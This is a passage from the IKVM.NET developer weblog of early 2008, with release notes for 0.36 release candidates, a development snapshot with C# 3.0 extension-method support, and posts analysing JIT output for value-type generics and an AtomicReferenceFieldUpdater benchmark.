<LI>java.awt.image.Raster <A href="http://developer.classpath.org/pipermail/classpath-patches/2008-January/005745.html">fix</A>. 
<LI>Fix bug in DynamicMethod based serialization for fields typed as ghost interfaces. 
<LI>Fixed ikvmc to support referencing assemblies that contain .NET type named java.lang.Object. 
<LI>Improved error handling for ikvmc -reference option. 
<LI>Optimized codegen for lcmp, fcmp<X>, dcmp<X> and shift opcodes. 
<LI>Added support to Class.forName() for loading Java types with assembly qualified type names. 
<LI>Implemented field/method/parameter annotation support for .NET types. 
<LI>Added workaround for .NET 1.1 bug in Directory.CreateDirectory(). (bug <A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=1902154&amp;group_id=69637&amp;atid=525264">#1902154</A>) 
<LI>Added -removeassertions optimization option to ikvmc. 
<LI>Added -removeassertions to IKVM.OpenJDK.ClassLibrary.dll build. 
<LI>Fixed JVM_CreateJavaVM to initialize the class library. 
<LI>Fixed ikvmc to include zero length resource files. 
<LI>Implemented SocketOptions.IP_MULTICAST_IF and SocketOptions.IP_MULTICAST_IF2. 
<LI>Fixed assembly class loader to ignore codebase for dynamic assemblies (previously it would throw an exception). 
<LI>Fixed exception stack trace code to return the .NET name of a type when a method in a primitive type is on the stack. 
<LI>Fixed JNI reflection to filter out HideFromReflection members. 
<LI>Fixed java.net.NetworkInterface to work on pre-Win2K3 systems. 
<LI>Fixed java.lang.Thread to set context class loader for threads started from .NET.</LI></UL>
<P>If you want to build from source, you need ikvm-0.36.11.zip, <A href="http://downloads.sourceforge.net/ikvm/classpath-0.95-stripped.zip?modtime=1197275284&amp;big_mirror=0">classpath-0.95-stripped.zip</A>, <A href="http://downloads.sourceforge.net/ikvm/openjdk-b13-stripped.zip?modtime=1197275056&amp;big_mirror=0">openjdk-b13-stripped.zip</A> and the java.awt.image.Raster <A href="http://developer.classpath.org/pipermail/classpath-patches/2008-January/005745.html">fix</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/07/2008 06:15:18 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e4dfe72d-a2ca-4d8d-be42-4f977b9b88b6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e4dfe72d-a2ca-4d8d-be42-4f977b9b88b6">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 24 March 2008</h2></div>
<div class="newsItems"><a name="a176a0394-a104-4e77-86a6-2ddc7030dc30"></a><div class="entry">
	<h3 class="entryTitle">Generic Algorithms Revisited (Again)</h3>
	<div class="entryBody">
		<P>Back in 2003 I <A HREF="/CommentView.aspx?guid=94eed5a8-6c9c-4d1d-a001-321344a2d2f6">described</A> how you could theoretically use value types to efficiently inject behavior into a generic type. Recently I was thinking about this again and decided to look at the code generated by the JIT.</P>
<P>Let's look at a very simple case:</P>
<P><CODE><FONT color=#0000ff>interface</FONT> <FONT color=#2b91af>IOperation</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>void</FONT> DoIt();<BR>}<BR><BR><FONT color=#0000ff>struct</FONT> <FONT color=#2b91af>Dummy</FONT> : <FONT color=#2b91af>IOperation</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>public</FONT> <FONT color=#0000ff>void</FONT> DoIt() { }<BR>}<BR><BR><FONT color=#0000ff>public</FONT> <FONT color=#0000ff>class</FONT> <FONT color=#2b91af>Program</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>static</FONT> <FONT color=#0000ff>void</FONT> Gen&lt;T&gt;() <FONT color=#0000ff>where</FONT> T : <FONT color=#2b91af>IOperation</FONT><BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>default</FONT>(T).DoIt();<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>static</FONT> <FONT color=#0000ff>void</FONT> Main()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>for</FONT> (; ; )<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Gen&lt;<FONT color=#2b91af>Dummy</FONT>&gt;();<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>}</CODE></P>
<P>The .NET 2.0 SP1 x86 JIT generates the following code for the <CODE>Gen&lt;Dummy&gt;()</CODE> method:</P>
<P><CODE>sub&nbsp;&nbsp;&nbsp; esp,8 <BR>xor&nbsp;&nbsp;&nbsp; eax,eax <BR>mov&nbsp;&nbsp;&nbsp; dword ptr [esp],eax <BR>mov&nbsp;&nbsp;&nbsp; dword ptr [esp+4],eax <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [esp],0 <BR>movsx&nbsp; eax,byte ptr [esp] <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [esp+4],al <BR>add&nbsp;&nbsp;&nbsp; esp,8 <BR>ret </CODE></P>
<P>The good news is that the <CODE>Dummy.DoIt()</CODE> method has been inlined. The bad news is that every single instruction apart from the <CODE>ret</CODE> is unnecessary.</P>
<P>In order to understand what is going on, we need to look at the IL generated by the C# compiler for the <CODE>Gen&lt;T&gt;()</CODE> method and we also need to know that the CLR treats zero length types as having a length of one byte.</P>
<P>Here's the IL for <CODE>Gen&lt;T&gt;()</CODE>:</P>
<P><CODE>.maxstack 1<BR>.locals init ([0] !!T CS$0$0000, [1] !!T CS$0$0001)<BR>ldloca.s CS$0$0000<BR>initobj !!T<BR>ldloc.0<BR>stloc.1<BR>ldloca.s CS$0$0001<BR>constrained. !!T<BR>callvirt instance void IOperation::DoIt()<BR>ret</CODE><BR></P>
<P>For some reason the <CODE>default(T).Doit()</CODE> construct results in two local variables being created. Now the JIT code above is starting to make a little sense (although it still isn't an excuse why it isn't optimized away):</P>
<TABLE width="100%" border=0>
<TBODY>
<TR>
<TD><CODE>sub&nbsp;&nbsp;&nbsp; esp,8<BR>xor&nbsp;&nbsp;&nbsp; eax,eax <BR>mov&nbsp;&nbsp;&nbsp; dword ptr [esp],eax <BR>mov&nbsp;&nbsp;&nbsp; dword ptr [esp+4],eax </CODE></TD>
<TD><CODE>.locals init ([0] !!T CS$0$0000, [1] !!T CS$0$0001)</CODE></TD></TR>
<TR>
<TD colSpan=2>Reserve and initialize space on the stack for the two local variables. Note that they are both unnecessarily padded, so we need 8 bytes intsead of 4.<BR>&nbsp;</TD></TR>
<TR>
<TD><CODE>mov&nbsp;&nbsp;&nbsp; byte ptr [esp],0</CODE></TD>
<TD><CODE>ldloca.s CS$0$0000<BR>initobj !!T</CODE></TD></TR>
<TR>
<TD colSpan=2>Initialize the first local variable.<BR>&nbsp;</TD></TR>
<TR>
<TD><CODE>movsx&nbsp; eax,byte ptr [esp]</CODE></TD>
<TD><CODE>ldloc.0</CODE></TD></TR>
<TR>
<TD colSpan=2>Read the value of the first local variable.<BR>&nbsp;</TD></TR>
<TR>
<TD><CODE>mov&nbsp;&nbsp;&nbsp; byte ptr [esp+4],al</CODE></TD>
<TD><CODE>stloc.1</CODE></TD></TR>
<TR>
<TD colSpan=2>Store the value we just read in the second local variable.<BR>&nbsp;</TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD><CODE>ldloca.s CS$0$0001<BR>constrained. !!T<BR>callvirt instance void IOperation::DoIt()</CODE></TD></TR>
<TR>
<TD colSpan=2>Inlined (empty) DoIt method.<BR>&nbsp;</TD></TR>
<TR>
<TD><CODE>add&nbsp;&nbsp;&nbsp; esp,8 <BR>ret</CODE></TD>
<TD><CODE>ret</CODE></TD></TR>
<TR>
<TD colSpan=2>Unreserve stack space and return to caller.</TD></TR></TBODY></TABLE>
<P><BR>We can improve the code a little by changing the <CODE>Gen&lt;T&gt;()</CODE> method body as follows:</P>
<P><CODE>T t = <FONT color=#0000ff>default</FONT>(T);<BR>t.DoIt();</CODE></P>
<P>Now the C# compiler won't generate the extra local variable and the x86 code looks a little better:</P>
<P><CODE>push&nbsp;&nbsp; eax <BR>xor&nbsp;&nbsp;&nbsp; eax,eax <BR>mov&nbsp;&nbsp;&nbsp; dword ptr [esp],eax <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [esp],0 <BR>pop&nbsp;&nbsp;&nbsp; ecx <BR>ret</CODE></P>
<P>For completeness here's the x64 code for the original <CODE>Gen&lt;Dummy&gt;()</CODE> method:</P>
<P><CODE>sub&nbsp;&nbsp;&nbsp; rsp,38h <BR>xor&nbsp;&nbsp;&nbsp; eax,eax <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [rsp+21h],al <BR>xor&nbsp;&nbsp;&nbsp; eax,eax <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [rsp+20h],al <BR>xor&nbsp;&nbsp;&nbsp; eax,eax <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [rsp+21h],al <BR>movzx&nbsp; eax,byte ptr [rsp+21h] <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [rsp+20h],al <BR>lea&nbsp;&nbsp;&nbsp; rcx,[rsp+20h] <BR>mov&nbsp;&nbsp;&nbsp; rax,6428001C078h <BR>call&nbsp;&nbsp; rax <BR>nop <BR>add&nbsp;&nbsp;&nbsp; rsp,38h <BR>rep ret </CODE></P>
<P>This is even worse than the x86 code, because the <CODE>Dummy.DoIt()</CODE> method isn't even inlined.</P>
<P><B>NGEN</B></P>
<P>The standard excuse of why a JIT doesn't do some "obvious" optimizations is of course that it runs while your program is supposed to be running, so it can't take a lot of time to analyze and optimize the code. This is true to some extent (and JIT performance is one reason why running your managed code on x64 takes so much longer to start up), but it doesn't apply to NGEN and from what I understand today's NGEN doesn't do any more optimizations than the JIT compiler. I tested this specific example (for x64) and the NGEN code is indeed identical to the JIT code. This is unfortunate and hopefully, someday we'll see more sophisticated optimizations specific to NGEN as well.</P>
<P><B>Conclusion</B></P>
<P>This trick of using value types in generic algorithms appears to work reasonably well on x86, but there is still room for improvement in the JIT. Rumour has it that in the next .NET 2.0 service pack (due out this summer?) there will be an update of the JIT that finally supports inlining of methods that have value type arguments, let's hope that this JIT update will also include other optimizations as well. Let's also hope that this update includes a better version of the x64 JIT, because as this example shows yet again the x64 JIT still considerably lags behind the x86 JIT.</P>
<P>P.S. Here's the Mono 1.9 x86 JIT code for the original <CODE>Gen&lt;Dummy&gt;()</CODE>:</P>
<P><CODE>push&nbsp;&nbsp; ebp <BR>mov&nbsp;&nbsp;&nbsp; ebp,esp <BR>sub&nbsp;&nbsp;&nbsp; esp,8 <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [ebp-8],0 <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [ebp-4],0 <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [ebp-8],0 <BR>movsx&nbsp; eax,byte ptr [ebp-8] <BR>mov&nbsp;&nbsp;&nbsp; byte ptr [ebp-4],al <BR>lea&nbsp;&nbsp;&nbsp; eax,[ebp-4] <BR>push&nbsp;&nbsp; eax <BR>call&nbsp;&nbsp; 02A20278 <BR>pop&nbsp;&nbsp;&nbsp; ecx <BR>leave <BR>ret</CODE></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/24/2008 09:23:29 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=176a0394-a104-4e77-86a6-2ddc7030dc30"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=176a0394-a104-4e77-86a6-2ddc7030dc30">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 14 March 2008</h2></div>
<div class="newsItems"><a name="a3511f073-85ff-4fc6-83bc-6d2a3a0c4ce7"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 Update 1 Release Candidate 5</h3>
	<div class="entryBody">
		<P>More fixes. Since I used version 0.36.0.10 for some interim fixes, this rc is 0.36.0.11.</P>
<P><B>Changes:</B></P>
<UL>
<LI>Changed version to 0.36.0.11.</LI>
<LI>Fixed ikvmc to include zero length resource files.</LI>
<LI>Implemented SocketOptions.IP_MULTICAST_IF and SocketOptions.IP_MULTICAST_IF2.</LI>
<LI>Fixed assembly class loader to ignore codebase for dynamic assemblies (previously it would throw an exception).</LI>
<LI>Fixed exception stack trace code to return the .NET name of a type when a method in a primitive type is on the stack.</LI>
<LI>Fixed JNI reflection to filter out HideFromReflection members.</LI>
<LI>Fixed java.net.NetworkInterface to work on pre-Win2K3 systems.</LI>
<LI>Fixed java.lang.Thread to set context class loader for threads started from .NET.</LI>
<LI>Added workaround for .NET 1.1 JIT bug exposed by bytecode optimizations introduced in 0.36.0.9.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.11.zip">ikvmbin-0.36.0.11.zip</A><BR>Sources (+ binaries):<A href="http://www.frijters.net/ikvm-0.36.0.11.zip">ikvm-0.36.0.11.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/14/2008 09:05:21 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3511f073-85ff-4fc6-83bc-6d2a3a0c4ce7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3511f073-85ff-4fc6-83bc-6d2a3a0c4ce7">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 28 February 2008</h2></div>
<div class="newsItems"><a name="a2db2f2e8-82c8-401e-b74c-da7cb51fa07c"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 Update 1 Release Candidate 4</h3>
	<div class="entryBody">
		<P>More fixes and a couple of optimizations. The bytecode optimizations and the removal of assert statements resulted in IKVM.OpenJDK.ClassLibrary.dll actually becoming smaller for once:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD><B>Version</B></TD>
<TD><B>IKVM.OpenJDK.ClassLibrary.dll size</B></TD></TR>
<TR>
<TD>0.36.0.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD>26,808,320</TD></TR>
<TR>
<TD>0.36.0.9</TD>
<TD>26,697,728</TD></TR></TBODY></TABLE>
<P><BR>The size difference is about evenly split between the bytecode optimizations and the assert statement removal.</P>
<P>The ikvmc option to remove assert statements is a bit of a cheat, but it turns out that in at least one case (java.util.BitSet) the assertions significantly affect performance (even when they are disabled) on .NET. This is the result of the CLR JIT not optimizing them away whereas HotSpot completely removes them when assertions aren't enabled. Given that this was affecting a real world scenario for an ikvm user I decided to add this option and compile the core class library with it. The option will only remove assert statements that it recognizes (i.e. the example code pattern mentioned in appendix IV of the assert <A href="http://java.sun.com/docs/books/jls/assert-spec.html">spec</A>).</P>
<P><B>Changes:</B></P>
<UL>
<LI>Changed version to 0.36.0.9.</LI>
<LI>Optimized codegen for lcmp, fcmp&lt;x&gt;, dcmp&lt;x&gt; and shift opcodes.</LI>
<LI>Added support to Class.forName() for loading Java types with assembly qualified type names.</LI>
<LI>Implemented field/method/parameter annotation support for .NET types.</LI>
<LI>Added workaround for .NET 1.1 bug in Directory.CreateDirectory(). (bug <A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=1902154&amp;group_id=69637&amp;atid=525264">#1902154</A>)</LI>
<LI>Added -removeassertions optimization option to ikvmc.</LI>
<LI>Added -removeassertions to IKVM.OpenJDK.ClassLibrary.dll build.</LI>
<LI>Fixed JVM_CreateJavaVM to initialize the class library.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.9.zip">ikvmbin-0.36.0.9.zip</A><BR>Sources (+ binaries):<A href="http://www.frijters.net/ikvm-0.36.0.9.zip">ikvm-0.36.0.9.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/28/2008 08:01:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2db2f2e8-82c8-401e-b74c-da7cb51fa07c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2db2f2e8-82c8-401e-b74c-da7cb51fa07c">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 19 February 2008</h2></div>
<div class="newsItems"><a name="ae4d05f17-2e13-4563-804e-7b1afd037632"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		 <p>More changes triggered by the changeover to .NET 2.0.I also did some C# 
 3.0 work which means that you can now do this:</p>
 <p><code><font color="#0000FF">using</font> System;<br>
 <font color="#0000FF">using</font> System.Collections;<br>
 <font color="#0000FF">using</font> ikvm.extensions;<br>
 <font color="#0000FF">using</font> java.util;<br>
 <br>
 <font color="#0000FF">public</font> <font color="#0000FF">class</font>
 <font color="#2B91AF">Program</font><br>
 {<br>
 &nbsp; <font color="#0000FF">static</font> <font color="#0000FF">void</font> Main(<font color="#0000FF">string</font>[] args)<br>
 &nbsp;
 {<br>
 &nbsp;&nbsp;&nbsp; <font color="#0000FF">try</font><br>
 &nbsp;&nbsp;&nbsp;
 {<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">var</font> map = 
 <font color="#0000FF">new</font> <font color="#2B91AF">HashMap</font> {<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 { <font color="#a31515">&quot;foo&quot;</font>, args.getClass() },<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 { <font color="#A31515">&quot;bar&quot;</font>, 2.getClass() }<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 };<br>
 <br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">foreach</font> (<font color="#2B91AF">DictionaryEntry</font> de
 <font color="#0000FF">in</font> map)<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#2B91AF">Console</font>.WriteLine(<font color="#A31515">&quot;{0} = {1}&quot;</font>, de.Key, de.Value);<br>
 &nbsp;&nbsp;&nbsp;
 }<br>
 &nbsp;&nbsp;&nbsp; <font color="#0000FF">catch</font> (System.<font color="#2B91AF">Exception</font> x)<br>
 &nbsp;&nbsp;&nbsp;
 {<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 x.printStackTrace();<br>
 &nbsp;&nbsp;&nbsp;
 }<br>
 &nbsp;
 }<br>
 }</code></p>
 <p>BTW, to enable defining extension methods without taking a dependency on 
 System.Core.dll, I've
 <a href="http://www.danielmoth.com/Blog/2007/05/using-extension-methods-in-fx-20.html">
 defined my own copy of System.Runtime.CompilerServices.ExtensionAttribute</a> 
 in IKVM.Runtime.dll (it's only public during the first compilation pass, so 
 it does not interfere with the real one in System.Core.dll if your project 
 references both IKVM.Runtime.dll and System.Core.dll).</p>
 <p><b>Changes:</b></p>
 <ul>
  <li>Renamed GetEnumerator method in implicit IEnumerable implementation 
  to work around lame bug in Xml serialization.</li>
  <li>Added support for defining non-virtual instance methods in map.xml.</li>
  <li>Added &quot;Add&quot; method to java.util.AbstractCollection to make some of 
  the .NET magic work on Java collections.</li>
  <li>Reintroduced baked TypeBuilder scrubbing hack for .NET 2.0 SP1.</li>
  <li>Made core assembly detection more robust.</li>
  <li>Improved ikvmc error handling for -reference option.</li>
  <li>Added support for defining extension methods in the core class 
  library assembly (without taking a System.Core.dll dependency).</li>
  <li>Added the first two extension methods (Object.getClass() and 
  Exception.printStackTrace()).</li>
  <li>Optimized codegen for lcmp, fcmp&lt;x&gt;, dcmp&lt;x&gt; and shift opcodes.</li>
  <li>Construct custom attribute annotation proxies directly instead of 
  going through the trouble to encode/decode them.</li>
  <li>Added support for explicitly implementing an interface method with 
  the &lt;override /&gt; element in map.xml.</li>
  <li>Added new utility class to enumerate maps.</li>
  <li>Made java.util.AbstractMap enumerable and added Add() method to 
  support C# 3.0 collection initialization syntax.</li>
</ul>
<p><b>WARNING</b>: THIS IS A DEVELOPMENT SNAPSHOT, NOT AN OFFICIAL RELEASE.</p>
 <p>Development snapshots are intended for evaluating and keeping track of where the project is going, not for production usage. The binaries have not been extensively tested 
 and are not strong named.</p>
 <p>This version does not currently work with Mono.</p>
<p>Binaries available here:
<a href="http://www.frijters.net/ikvmbin-0.37.2970.zip">ikvmbin-0.37.2970.zip</a></p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/19/2008 06:13:20 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e4d05f17-2e13-4563-804e-7b1afd037632"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e4d05f17-2e13-4563-804e-7b1afd037632">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 04 February 2008</h2></div>
<div class="newsItems"><a name="ac0bc114a-6e3d-4444-8939-9837fd0a2f8b"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 Update 1 Release Candidate 3</h3>
	<div class="entryBody">
		<P>I screwed up the previous release candidate build by building it on .NET .2.0. So here's a new release candidate that's built on .NET 1.1 again (and I threw in a couple of small fixes as well.)</P>
<P><B>Changes:</B></P>
<UL>
<LI>Changed version to 0.36.0.8.</LI>
<LI>Fixed ikvmc to support referencing assemblies that contain .NET type named java.lang.Object.</LI>
<LI>Improved error handling for ikvmc -reference option.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.8.zip">ikvmbin-0.36.0.8.zip</A><BR>Sources (+ binaries):<A href="http://www.frijters.net/ikvm-0.36.0.8.zip">ikvm-0.36.0.8.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/04/2008 16:18:04 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c0bc114a-6e3d-4444-8939-9837fd0a2f8b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c0bc114a-6e3d-4444-8939-9837fd0a2f8b">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 31 January 2008</h2></div>
<div class="newsItems"><a name="a5402bb0a-5f05-4939-9d13-fd42166155b6"></a><div class="entry">
	<h3 class="entryTitle">How to Disassemble an AtomicReferenceFieldUpdater</h3>
	<div class="entryBody">
		 <p>It's been a while since I've done an in depth investigation of a 
 microbenchmark and the 
 <a HREF="/PermaLink.aspx?guid=15ad7222-7805-49f0-8e19-e6ac62403fac">recent work</a> I did on
 <code><a href="http://java.sun.com/javase/6/docs/api/java/util/concurrent/atomic/AtomicReferenceFieldUpdater.html">
 AtomicReferenceFieldUpdater</a></code> to make it work in partial trust also has a 
 nice performance impact. So let's investigate that.</p>
 <p><b>The Microbenchmark</b></p>
 <p><code><font color="#0000FF">import</font> java.util.concurrent.atomic.*;<br>
 <br>
 <font color="#0000FF">class</font> <font color="#2B91AF">Test</font>
{<br>
&nbsp; <font color="#0000FF">volatile</font> <font color="#2B91AF">Object</font> field;<br>
 <br>
&nbsp; <font color="#0000FF">public</font> <font color="#0000FF">static</font>
 <font color="#0000FF">void</font> main(<font color="#2B91AF">String</font>[] args)
  {<br>
&nbsp;&nbsp;&nbsp; <font color="#2B91AF">AtomicReferenceFieldUpdater</font> upd =<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#2B91AF">AtomicReferenceFieldUpdater</font>.newUpdater(<font color="#2B91AF">Test</font>.<font color="#0000FF">class</font>, 
 <font color="#2B91AF">Object</font>.<font color="#0000FF">class</font>, 
 <font color="#a31515">"field"</font>);<br>
&nbsp;&nbsp;&nbsp; <font color="#2B91AF">Test</font> obj = <font color="#0000FF">new</font>
 <font color="#2B91AF">Test</font>();<br>
&nbsp;&nbsp;&nbsp; <font color="#0000FF">for</font> (<font color="#0000FF">int</font> j = 0; j &lt; 5; j++)
    {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">long</font> start = 
 <font color="#2B91AF">System</font>.currentTimeMillis();<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">for</font> (<font color="#0000FF">int</font> i = 0; i &lt; 10000000; i++)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        upd.compareAndSet(obj, <font color="#0000FF">null</font>, 
 <font color="#0000FF">null</font>);<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">long</font> end = 
 <font color="#2B91AF">System</font>.currentTimeMillis();<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#2B91AF">System</font>.out.println(end - start);<br>
&nbsp;&nbsp;&nbsp;
    }<br>
&nbsp;
  }<br>
}
</code></p>
 <p><b>The Results</b></p>
 <p>
 <table border="0" class="ms-simple2-main" cellspacing="0">
  <!-- fpstyle: 2,011111100 -->
  <tr>
   <td style="border-bottom: 1px solid black; border-right: 1px solid black;">&nbsp;</td>
   <td style="border-bottom: 1px solid black;">&nbsp;&nbsp;&nbsp;&nbsp; IKVM 0.34</td>
   <td style="border-bottom: 1px solid black;">&nbsp;&nbsp;&nbsp;&nbsp; IKVM 0.36</td>
   <td style="border-bottom: 1px solid black;">&nbsp;&nbsp;&nbsp;&nbsp; IKVM 0.37</td>
   <td style="border-bottom: 1px solid black;">&nbsp;&nbsp;&nbsp;&nbsp; JDK 1.6</td>
  </tr>
  <tr>
   <td style="border-right: 1px solid black;">.NET 1.1</td>
   <td align="right">36808</td>
   <td align="right">41453</td>
   <td align="right">&nbsp;</td>
   <td align="right">&nbsp;</td>
  </tr>
  <tr>
   <td style="border-right: 1px solid black;">.NET 2.0 / x86&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </td>
   <td align="right">75647</td>
   <td align="right">5776</td>
   <td align="right">561</td>
   <td align="right">321</td>
  </tr>
  <tr>
   <td style="border-right: 1px solid black;">.NET 2.0 / x64</td>
   <td align="right">&nbsp;</td>
   <td align="right">5081</td>
   <td align="right">512</td>
   <td align="right">245</td>
  </tr>
 </table><br></p>
<p><b>The Differences</b></p>
 <p>The first thing that jumps out is that the IKVM 0.34 
 results show that .NET 2.0 reflection 
 is much slower than .NET 1.1 reflection. On IKVM 0.36 the reflection 
 implementation changed to take advantage of <code>
 <a href="http://msdn2.microsoft.com/en-us/library/system.reflection.emit.dynamicmethod.aspx">DynamicMethod</a></code> 
 when running on .NET 2.0, so 
 there we see a big improvement in performance when running on .NET 2.0.</p>
 <p>IKVM 0.37 has the new AtomicReferenceFieldUpdate optimization that no 
 longer uses reflection (if it can figure out at compile time what to do), 
 this again yields a big performance improvement.</p>
 <p>Finally, HotSpot manages to beat IKVM be a factor of two. There is no 
 difference between HotSpot client and server modes for this benchmark (on 
 JDK 1.6).</p>
 <p><b>The Compiler</b></p>
 <p>Let's look at some C# pseudo code that shows what ikvmc 0.37 generates 
 for the above benchmark:</p>
 <p><code><font color="#0000FF">using</font> java.util.concurrent.atomic;<br>
 <font color="#0000FF">using</font> System.Threading;<br>
 <br>
 <font color="#0000FF">class</font> <font color="#2B91AF">Test</font>
 {<br>
 &nbsp; <font color="#0000FF">volatile</font> <font color="#0000FF">object</font> field;<br>
 <br>
 &nbsp; <font color="#0000FF">private</font> <font color="#0000FF">sealed</font>
 <font color="#0000FF">class</font> <font color="#2B91AF">__ARFU_fieldLjava/lang/Object;</font> : 
 <font color="#2B91AF">AtomicReferenceFieldUpdater</font>
 {<br>
 &nbsp;&nbsp;&nbsp; <font color="#0000FF">public</font> <font color="#0000FF">override</font>
 <font color="#0000FF">bool</font> compareAndSet(<font color="#0000FF">object</font> obj, 
 <font color="#0000FF">object</font> expect, <font color="#0000FF">object</font> update)
 {<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">return</font>
 expect ==<font color="#2B91AF"> Interlocked</font>.CompareExchange(<font color="#0000FF">ref</font> 
 ((<font color="#2B91AF">Test</font>)obj).field,<br>
